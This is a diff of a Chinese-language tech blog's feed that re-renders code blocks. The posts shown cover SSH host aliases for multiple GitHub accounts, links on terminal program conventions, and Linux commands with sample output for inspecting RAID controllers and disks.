@@ -13,27 +13,31 @@
 &lt;li&gt;&lt;a href="https://stevenharman.net/configure-ssh-keys-for-multiple-github-accounts" target="_blank" rel="noopener"&gt;設定多個 GitHub 帳號的 SSH 金鑰&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 &lt;h3 id="使用不同的-host-值"&gt;使用不同的 Host 值&lt;/h3&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Host github.com
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; HostName github.com
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; User git
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; IdentityFile ~/.ssh/id_fry_ed25519
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Host github-plnx
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; HostName github.com
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; User git
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; IdentityFile ~/.ssh/id_fry_plnx_ed25519
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#7f848e"&gt;# Instead of the actual URL&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$ git clone git@github.com:planet-express/delivery_service.git
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#7f848e"&gt;# Substitue in our custom Host value for the `github.com` part&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$ git clone git@github-plnx:planet-express/delivery_service.git
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id="自動替換-host"&gt;自動替換 Host&lt;/h3&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#56b6c2"&gt;[&lt;/span&gt;include&lt;span style="color:#56b6c2"&gt;]&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#e06c75"&gt;path&lt;/span&gt; &lt;span style="color:#56b6c2"&gt;=&lt;/span&gt; ~/.gitconfig_custom
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#7f848e"&gt;# See custom `Host github-plnx` in ~/.ssh/config&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#56b6c2"&gt;[&lt;/span&gt;url &lt;span style="color:#98c379"&gt;&amp;#34;github-plnx:planet-express&amp;#34;&lt;/span&gt;&lt;span style="color:#56b6c2"&gt;]&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#e06c75"&gt;insteadOf&lt;/span&gt; &lt;span style="color:#56b6c2"&gt;=&lt;/span&gt; git@github.com:planet-express
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description></item><item><title>終端機程式遵循的規則</title><link>https://linzeyan.github.io/zh-tw/posts/2024/20241225-terminal-rules/</link><pubDate>Wed, 25 Dec 2024 08:45:00 +0800</pubDate><guid>https://linzeyan.github.io/zh-tw/posts/2024/20241225-terminal-rules/</guid><description>&lt;ul&gt;
+&lt;div class="code-block" data-code-block&gt;&lt;div class="code-block-full" id="code-block-7e87e417602f22d73c3fcea75d2e62d3-0"&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Host github.com
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; HostName github.com
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; User git
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; IdentityFile ~/.ssh/id_fry_ed25519
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Host github-plnx
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; HostName github.com
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; User git
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; IdentityFile ~/.ssh/id_fry_plnx_ed25519
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;script type="application/json" class="code-block-data"&gt;{"copyButton":true,"expanded":false,"labels":{"code":"Code","copied":"Copied!","copy":"Copy","copyError":"Copy failed. Try again.","showAll":"Show all {count} lines","showLess":"Show fewer lines"},"language":"","preview":"","source":"Host github.com\n HostName github.com\n User git\n IdentityFile ~/.ssh/id_fry_ed25519\n\nHost github-plnx\n HostName github.com\n User git\n IdentityFile ~/.ssh/id_fry_plnx_ed25519\n","title":"bash"}&lt;/script&gt;&lt;/div&gt;&lt;div class="code-block" data-code-block&gt;&lt;div class="code-block-full" id="code-block-7e87e417602f22d73c3fcea75d2e62d3-1"&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# Instead of the actual URL&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;$ git clone git@github.com:planet-express/delivery_service.git
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# Substitue in our custom Host value for the `github.com` part&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;$ git clone git@github-plnx:planet-express/delivery_service.git
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;script type="application/json" class="code-block-data"&gt;{"copyButton":true,"expanded":false,"labels":{"code":"Code","copied":"Copied!","copy":"Copy","copyError":"Copy failed. Try again.","showAll":"Show all {count} lines","showLess":"Show fewer lines"},"language":"","preview":"","source":"# Instead of the actual URL\n$ git clone git@github.com:planet-express/delivery_service.git\n\n# Substitue in our custom Host value for the `github.com` part\n$ git clone git@github-plnx:planet-express/delivery_service.git\n","title":"bash"}&lt;/script&gt;&lt;/div&gt;&lt;h3 id="自動替換-host"&gt;自動替換 Host&lt;/h3&gt;
+&lt;div class="code-block" data-code-block&gt;&lt;div class="code-block-full" id="code-block-7e87e417602f22d73c3fcea75d2e62d3-2"&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;include&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nv"&gt;path&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; ~/.gitconfig_custom
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;script type="application/json" class="code-block-data"&gt;{"copyButton":true,"expanded":false,"labels":{"code":"Code","copied":"Copied!","copy":"Copy","copyError":"Copy failed. Try again.","showAll":"Show all {count} lines","showLess":"Show fewer lines"},"language":"","preview":"","source":"[include]\n path = ~/.gitconfig_custom\n","title":"bash"}&lt;/script&gt;&lt;/div&gt;&lt;div class="code-block" data-code-block&gt;&lt;div class="code-block-full" id="code-block-7e87e417602f22d73c3fcea75d2e62d3-3"&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# See custom `Host github-plnx` in ~/.ssh/config&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;url &lt;span class="s2"&gt;&amp;#34;github-plnx:planet-express&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nv"&gt;insteadOf&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; git@github.com:planet-express
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;script type="application/json" class="code-block-data"&gt;{"copyButton":true,"expanded":false,"labels":{"code":"Code","copied":"Copied!","copy":"Copy","copyError":"Copy failed. Try again.","showAll":"Show all {count} lines","showLess":"Show fewer lines"},"language":"","preview":"","source":"# See custom `Host github-plnx` in ~/.ssh/config\n[url \"github-plnx:planet-express\"]\n insteadOf = git@github.com:planet-express\n","title":"bash"}&lt;/script&gt;&lt;/div&gt;</description></item><item><title>終端機程式遵循的規則</title><link>https://linzeyan.github.io/zh-tw/posts/2024/20241225-terminal-rules/</link><pubDate>Wed, 25 Dec 2024 08:45:00 +0800</pubDate><guid>https://linzeyan.github.io/zh-tw/posts/2024/20241225-terminal-rules/</guid><description>&lt;ul&gt;
 &lt;li&gt;
 &lt;p&gt;&lt;a href="https://jvns.ca/blog/2024/11/26/terminal-rules/" target="_blank" rel="noopener"&gt;終端機程式遵循的「規則」&lt;/a&gt;&lt;/p&gt;
 &lt;/li&gt;
@@ -74,192 +78,198 @@
 &lt;li&gt;&lt;a href="https://www.baeldung.com/linux/raid-information-command-line" target="_blank" rel="noopener"&gt;在 Linux 中偵測 RAID 資訊&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 &lt;h5 id="lspci"&gt;lspci&lt;/h5&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;lspci | grep RAID
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;00:1f.2 RAID bus controller: Intel Corporation &lt;span style="color:#d19a66"&gt;82801&lt;/span&gt; Mobile SATA Controller &lt;span style="color:#56b6c2"&gt;[&lt;/span&gt;RAID mode&lt;span style="color:#56b6c2"&gt;]&lt;/span&gt; &lt;span style="color:#56b6c2"&gt;(&lt;/span&gt;rev 04&lt;span style="color:#56b6c2"&gt;)&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h5 id="lshw"&gt;lshw&lt;/h5&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;lshw -class storage
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; *-raid
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; description: RAID bus controller
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; product: &lt;span style="color:#d19a66"&gt;82801&lt;/span&gt; Mobile SATA Controller &lt;span style="color:#56b6c2"&gt;[&lt;/span&gt;RAID mode&lt;span style="color:#56b6c2"&gt;]&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; vendor: Intel Corporation
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; physical id: 1f.2
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; bus info: pci@0000:00:1f.2
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; logical name: scsi0
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; version: &lt;span style="color:#d19a66"&gt;04&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; width: &lt;span style="color:#d19a66"&gt;32&lt;/span&gt; bits
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; clock: 66MHz
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; capabilities: raid msi pm bus_master cap_list emulated
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; configuration: &lt;span style="color:#e06c75"&gt;driver&lt;/span&gt;&lt;span style="color:#56b6c2"&gt;=&lt;/span&gt;ahci &lt;span style="color:#e06c75"&gt;latency&lt;/span&gt;&lt;span style="color:#56b6c2"&gt;=&lt;/span&gt;&lt;span style="color:#d19a66"&gt;0&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; resources: irq:26 ioport:f0d0&lt;span style="color:#56b6c2"&gt;(&lt;/span&gt;&lt;span style="color:#e06c75"&gt;size&lt;/span&gt;&lt;span style="color:#56b6c2"&gt;=&lt;/span&gt;8&lt;span style="color:#56b6c2"&gt;)&lt;/span&gt; ioport:f0c0&lt;span style="color:#56b6c2"&gt;(&lt;/span&gt;&lt;span style="color:#e06c75"&gt;size&lt;/span&gt;&lt;span style="color:#56b6c2"&gt;=&lt;/span&gt;4&lt;span style="color:#56b6c2"&gt;)&lt;/span&gt; ioport:f0b0&lt;span style="color:#56b6c2"&gt;(&lt;/span&gt;&lt;span style="color:#e06c75"&gt;size&lt;/span&gt;&lt;span style="color:#56b6c2"&gt;=&lt;/span&gt;8&lt;span style="color:#56b6c2"&gt;)&lt;/span&gt; ioport:f0a0&lt;span style="color:#56b6c2"&gt;(&lt;/span&gt;&lt;span style="color:#e06c75"&gt;size&lt;/span&gt;&lt;span style="color:#56b6c2"&gt;=&lt;/span&gt;4&lt;span style="color:#56b6c2"&gt;)&lt;/span&gt; ioport:f060&lt;span style="color:#56b6c2"&gt;(&lt;/span&gt;&lt;span style="color:#e06c75"&gt;size&lt;/span&gt;&lt;span style="color:#56b6c2"&gt;=&lt;/span&gt;32&lt;span style="color:#56b6c2"&gt;)&lt;/span&gt; memory:f7e36000-f7e367ff
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h5 id="smartctl"&gt;smartctl&lt;/h5&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;dmesg | grep -i scsi
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#56b6c2"&gt;[&lt;/span&gt; 0.210852&lt;span style="color:#56b6c2"&gt;]&lt;/span&gt; SCSI subsystem initialized
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#56b6c2"&gt;[&lt;/span&gt; 0.341280&lt;span style="color:#56b6c2"&gt;]&lt;/span&gt; Block layer SCSI generic &lt;span style="color:#56b6c2"&gt;(&lt;/span&gt;bsg&lt;span style="color:#56b6c2"&gt;)&lt;/span&gt; driver version 0.4 loaded &lt;span style="color:#56b6c2"&gt;(&lt;/span&gt;major 243&lt;span style="color:#56b6c2"&gt;)&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;...
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#56b6c2"&gt;[&lt;/span&gt; 1.213299&lt;span style="color:#56b6c2"&gt;]&lt;/span&gt; scsi 0:0:0:0: Direct-Access ATA ST320LT012-9WS14 YAM1 PQ: &lt;span style="color:#d19a66"&gt;0&lt;/span&gt; ANSI: &lt;span style="color:#d19a66"&gt;5&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#56b6c2"&gt;[&lt;/span&gt; 1.319886&lt;span style="color:#56b6c2"&gt;]&lt;/span&gt; sd 0:0:0:0: &lt;span style="color:#56b6c2"&gt;[&lt;/span&gt;sda&lt;span style="color:#56b6c2"&gt;]&lt;/span&gt; Attached SCSI disk
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#56b6c2"&gt;[&lt;/span&gt; 19.571008&lt;span style="color:#56b6c2"&gt;]&lt;/span&gt; sd 0:0:0:0: Attached scsi generic sg0 &lt;span style="color:#e5c07b"&gt;type&lt;/span&gt; &lt;span style="color:#d19a66"&gt;0&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;smartctl --all /dev/sda
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Model Family: Seagate Laptop HDD
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Device Model: ST320LT012-9WS14C
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Serial Number: S0V3R9LL
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;LU WWN Device Id: &lt;span style="color:#d19a66"&gt;5&lt;/span&gt; 000c50 05be4653c
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Firmware Version: 0001YAM1
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;User Capacity: 320,072,933,376 bytes &lt;span style="color:#56b6c2"&gt;[&lt;/span&gt;&lt;span style="color:#d19a66"&gt;320&lt;/span&gt; GB&lt;span style="color:#56b6c2"&gt;]&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Sector Sizes: &lt;span style="color:#d19a66"&gt;512&lt;/span&gt; bytes logical, &lt;span style="color:#d19a66"&gt;4096&lt;/span&gt; bytes physical
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Rotation Rate: &lt;span style="color:#d19a66"&gt;5400&lt;/span&gt; rpm
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Form Factor: 2.5 inches
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Device is: In smartctl database 7.3/5319
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;ATA Version is: ATA8-ACS T13/1699-D revision &lt;span style="color:#d19a66"&gt;4&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;SATA Version is: SATA 2.6, 3.0 Gb/s &lt;span style="color:#56b6c2"&gt;(&lt;/span&gt;current: 3.0 Gb/s&lt;span style="color:#56b6c2"&gt;)&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Local Time is: Sat Nov &lt;span style="color:#d19a66"&gt;19&lt;/span&gt; 20:52:01 &lt;span style="color:#d19a66"&gt;2022&lt;/span&gt; PKT
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;SMART support is: Available - device has SMART capability.
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;SMART support is: Enabled
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;...
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h5 id="megacli"&gt;MegaCLI&lt;/h5&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;megacli -LDInfo -Lall -aALL
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Adapter &lt;span style="color:#d19a66"&gt;0&lt;/span&gt; -- Virtual Drive Information:
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Virtual Drive: &lt;span style="color:#d19a66"&gt;0&lt;/span&gt; &lt;span style="color:#56b6c2"&gt;(&lt;/span&gt;Target Id: 0&lt;span style="color:#56b6c2"&gt;)&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Name : SEAGATE
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;RAID Level : Primary-1, Secondary-0, RAID Level Qualifier-0
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Size : &lt;span style="color:#d19a66"&gt;320&lt;/span&gt; GB
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Sector Size : &lt;span style="color:#d19a66"&gt;512&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Mirror Data : &lt;span style="color:#d19a66"&gt;320&lt;/span&gt; GB
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;State : Optimal
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;...
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h5 id="lsscsi"&gt;lsscsi&lt;/h5&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;lsscsi
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#56b6c2"&gt;[&lt;/span&gt;0:0:0:0&lt;span style="color:#56b6c2"&gt;]&lt;/span&gt; disk ATA ST320LT012-9WS14 YAM1 /dev/sda
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h5 id="廠商專用工具"&gt;廠商專用工具&lt;/h5&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;omreport storage vdisk
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;List of Virtual Disks in the System
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Controller SEAGATE Laptop HDD
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;ID : &lt;span style="color:#d19a66"&gt;0&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Status : Ok
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Name : SEAGATE
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;State : Ready
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Hot Spare Policy violated : Not Assigned
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Encrypted : No
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Layout : RAID-0
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Size : 320.00 GB &lt;span style="color:#56b6c2"&gt;(&lt;/span&gt;&lt;span style="color:#d19a66"&gt;343597383680&lt;/span&gt; bytes&lt;span style="color:#56b6c2"&gt;)&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;T10 Protection Information Status : No
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Associated Fluid Cache State : Not Applicable
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Device Name : /dev/sda
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Bus Protocol : ATA
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Media : HDD
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Read Policy : Adaptive Read Ahead
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Write Policy : Write Back
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Cache Policy : Not Applicable
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Stripe Element Size : &lt;span style="color:#d19a66"&gt;128&lt;/span&gt; KB
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Disk Cache Policy : Enabled
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description></item><item><title>測試伺服器是否易受 Shellshock 漏洞影響</title><link>https://linzeyan.github.io/zh-tw/posts/2022/20221128-linux-shellshock-bug/</link><pubDate>Mon, 28 Nov 2022 15:35:30 +0800</pubDate><guid>https://linzeyan.github.io/zh-tw/posts/2022/20221128-linux-shellshock-bug/</guid><description>&lt;ul&gt;
+&lt;div class="code-block" data-code-block&gt;&lt;div class="code-block-full" id="code-block-62eac0f57da15fed78a76db9083c21aa-0"&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;lspci &lt;span class="p"&gt;|&lt;/span&gt; grep RAID
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;00:1f.2 RAID bus controller: Intel Corporation &lt;span class="m"&gt;82801&lt;/span&gt; Mobile SATA Controller &lt;span class="o"&gt;[&lt;/span&gt;RAID mode&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;rev 04&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
